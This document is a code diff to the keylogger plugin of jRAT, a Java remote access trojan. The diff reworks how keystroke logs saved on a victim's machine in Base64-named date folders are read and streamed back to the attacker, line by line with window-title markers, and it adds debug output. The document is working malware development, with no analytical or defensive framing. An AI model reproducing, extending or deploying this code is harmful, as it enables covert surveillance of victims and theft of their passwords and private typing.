@@ -9,6 +9,8 @@ import java.io.FileInputStream;
 import java.io.FileWriter;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
+import java.util.ArrayList;
+import java.util.List;
 
 import org.jnativehook.GlobalScreen;
 
@@ -93,20 +95,36 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 			
 			File file = new File(Keylogger.getLogsRoot().getAbsolutePath() + "/" + Base64.encode(year) + "/" + Base64.encode(month) + "/" + Base64.encode(day));
 		
-			String text = "";
+			List<String> lines = new ArrayList<String>();
 			String s;
 			
 			BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file)));
 			
 			while ((s = reader.readLine()) != null) {
-				text += s + "\n";
+				lines.add(s);
 			}
 			
 			reader.close();
 			
 			dos.writeByte(LOG_HEADER);
-			dos.writeInt(text.length());
-			dos.writeChars(text);
+		
+			for (int i = 0; i < lines.size(); i++) {
+				String line = lines.get(i);
+				
+				dos.writeBoolean(true);
+				
+				if (line.startsWith("[Window:")) {
+					dos.writeInt(-1);
+					dos.writeUTF(line);
+				} else {
+					dos.writeInt(line.length());
+					dos.writeChars(line);
+				}
+			}
+			
+			dos.writeBoolean(false);
+			
+			lines.clear();
 		}
 	}
 
@@ -170,8 +188,10 @@ public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
 						PrintWriter out = new PrintWriter(new BufferedWriter(new FileWriter(Keylogger.getTodaysFile(), true)));
 						
 						for (Activity a : Activities.activities) {
+							System.out.println(a.toString());
+							System.out.println(a.getClass().getSimpleName());
 							if (a instanceof Title) {
-								out.println("\n[Window: " + a.toString() + "]");
+								out.println("\n[Window: " + a.toString() + "]\n");
 							} else if (a instanceof Key) {
 								char ckey = ((Key)a).getChar();
 								String key;
